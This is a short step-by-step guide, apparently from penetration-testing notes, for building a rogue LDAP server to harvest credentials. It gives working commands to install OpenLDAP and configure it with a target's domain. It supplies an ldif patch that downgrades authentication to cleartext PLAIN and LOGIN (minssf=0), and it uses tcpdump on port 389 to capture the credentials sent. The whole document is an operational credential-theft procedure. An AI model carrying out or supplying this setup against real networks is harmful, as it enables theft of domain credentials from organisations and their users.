#  Creating a Rogue LDAP Server

Some of the techniques requires you to create a rogue LDAP server. Below is a short guide on setting up.

## Guide

1. Install OpenLDAP
```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

2. Configure your LDAP server
```bash
sudo dpkg-reconfigure -p low slapd
```
- Following the steps below to set up the slapd settings:
  - Make sure to press <No> when requested if you want to skip server configuration. Choose No.
  - For the DNS domain name, you want to provide our target domain, which is your DC main domain.
  - Use this same name for the Organisation name as well.
  - Provide any Administrator password, just ignore it.
  - Select MDB as the LDAP database to use. Choose MDB.
  - For the last two options, ensure the database is not removed when purged. Choose No.
  - Move old database files before a new one is created. Choose Yes.

3. Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods.
- We need to create a new ldif file and called with the following content:
```bash
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
4. Now we can use the ldif file to patch our LDAP server using the following:
``` bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
  
5. Verify the LDAP server config
```bash
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```
  
6. Capture LDAP credential
``` bash
sudo tcpdump -SX -i eth0 tcp port 389
```
Note: You may have to change eth0 to whichever interface on your machine
